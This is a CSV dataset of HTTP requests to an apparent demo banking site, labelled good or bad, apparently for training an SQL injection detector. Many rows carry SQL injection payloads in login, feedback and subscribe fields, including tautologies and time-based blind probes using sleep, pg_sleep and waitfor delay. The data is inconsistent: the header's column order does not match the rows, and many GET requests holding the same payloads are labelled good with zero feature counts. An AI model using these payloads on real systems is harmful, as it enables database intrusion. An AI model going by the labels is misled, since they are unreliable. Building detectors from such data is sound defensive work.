method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,btnSubmit=Login&passw=-1%20OR%202%2B919-919-1=0%2B0%2B0%2B1%20--%20&uid=1,/doLogin,0,0,2,0,4,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=%F0''%F0""""&uid=e",/doLogin,4,4,0,0,0,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst""%20AND%202*3*8=6*8%20AND%20""pMWB""=""pMWB&name=zFPWdwPk&subject=1",/sendFeedback,0,8,0,0,6,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/feedback.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%2023=23%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,6,2,bad
POST,btnSubmit=Subscribe&txtEmail=sample%40email.tst'%20AND%202*3*8=6*8%20AND%20'atOO'='atOO,/doSubscribe,8,0,0,0,4,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=%F0''%F0""""&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,0,2,0,bad
GET,,/index.jsp?content=-1%20OR%203%2B893-893-1=0%2B0%2B0%2B1&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=(select(0)from(select(sleep(10)))v)/*'%2B(select(0)from(select(sleep(10)))v)%2B'""%2B(select(0)from(select(sleep(10)))v)%2B""*/",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=LAVnRiht';%20waitfor%20delay%20'0:0:5'%20--%20,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1;select%20pg_sleep(9);%20--%20,/sendFeedback,0,0,2,2,5,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=privacy.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2B5%2B449-449)%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,2,6,0,bad
POST,btnSubmit=Login&passw=-1'%20OR%202%2B1-1-1=1%20AND%2000027=00027%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/login.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=if(now()=sysdate()%2Csleep(6)%2C0),/sendFeedback,0,0,0,8,2,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=y8RejEqv';%20waitfor%20delay%20'0:0:7'%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=%40%40jaGQW,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp?query=-1%20OR%203*2<(0%2B5%2B646-646),0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/swagger/swagger-ui-standalone-preset.js,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=%5C,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,30,2,18,bad
GET,,/,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1%20OR%202%2B768-768-1=0%2B0%2B0%2B1%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,0,6,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/",0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=amgT2bvu';%20waitfor%20delay%20'0:0:3'%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"(select(0)from(select(sleep(44.43)))v)/*'%2B(select(0)from(select(sleep(44.43)))v)%2B'""%2B(select(0)from(select(sleep(44.43)))v)%2B""*/&passw=g00dPa%24%24w0rD&uid=e",/doLogin,4,4,0,30,0,20,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=q0xBh3sp&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,r8QIJ0wR';select%20pg_sleep(9);%20--%20&txtEmail=sample%40email.tst,/doSubscribe,2,0,2,2,3,4,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/default.jsp?content=1'""",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1%20OR%202%2B126-126-1=0%2B0%2B0%2B1&uid=e,/doLogin,0,0,0,0,2,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=LxkDsqKV,/sendFeedback,0,0,0,0,2,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/pr,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=oPAFmk6n'));select%20pg_sleep(3);%20--%20,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%2023=23%20AND%203%2B1-1-1=1%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=%40%40PcVha&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
POST,%40%40Cj2Fn&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/survey_questions.jsp?step=1'""",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=-1%20OR%203%2B785-785-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=M9axHgWy,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%C0%A7%C0%A2%252527%252522,/doLogin,0,0,0,0,0,2,bad
GET,,/swagger/,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=1'""",/doSubscribe,2,2,0,0,0,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2B5%2B23-23)%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,2,4,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/favicon.ico,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B851-851-1=0%2B0%2B0%2B1&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=HU3MvAOa';%20waitfor%20delay%20'0:0:6'%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,6,0,2,0,7,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,r6zWD7Hi';%20waitfor%20delay%20'0:0:14.81'%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,6,0,2,0,5,6,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/index/1'""1000",0,0,0,0,0,0,good
POST,1%00%C0%A7%C0%A2%252527%252522&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""d6nP""=""d6nP&job=MortgageLendingAccountExecutive:Sales",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=pYs1R988&template=US,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_trainee.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2B804-804-1=0%2B0%2B0%2B1&subject=1,/sendFeedback,0,0,0,0,4,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%202%2B229-229-1=0%2B0%2B0%2B1%20--%20&uid=1,/doLogin,2,0,2,0,4,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=1%00%C0%A7%C0%A2%252527%252522&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/CxpVI65p,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp?query=1,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=%BF'%BF""&uid=1",/doLogin,2,2,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/status_check.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z,/doLogin,4,0,0,10,0,4,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=(select(0)from(select(sleep(7)))v)/*'%2B(select(0)from(select(sleep(7)))v)%2B'""%2B(select(0)from(select(sleep(7)))v)%2B""*/&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,30,2,18,bad
POST,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%2023=23%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/index.jsp?content=inside_jobs.htm&job=-1'%20OR%202%2B504-504-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=qzISTNNr');select%20pg_sleep(3);%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp?content=security.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%2000027=00027%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,"/default.jsp?content=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,0'XOR(if(now()=sysdate()%2Csleep(44.43)%2C0))XOR'Z&passw=g00dPa%24%24w0rD&uid=e,/doLogin,4,0,0,10,0,4,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,jM5CBDn3'));select%20pg_sleep(0);%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,3,4,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=%5C&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_contact.htm%25'%20AND%202*3*8=6*8%20AND%20'Qvto'!='Qvto%25,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=-1%20OR%203%2B745-745-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&subject=1,/sendFeedback,4,0,0,10,2,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%406rvMO&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/",/doLogin,4,4,0,30,0,20,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(6);%20--%20,/doLogin,0,0,2,2,3,6,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z,/doSubscribe,4,0,0,10,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=UqEqsiFs&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,1%00%C0%A7%C0%A2%252527%252522&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2B811-811-1=0%2B0%2B0%2B1%20--%20,/doLogin,2,0,2,0,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,1%00%C0%A7%C0%A2%252527%252522&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,BNDpYGjO'));select%20pg_sleep(9);%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,3,4,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%40M9XZm&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=NqoZYfyt';select%20pg_sleep(10);%20--%20,0,0,0,0,0,0,good
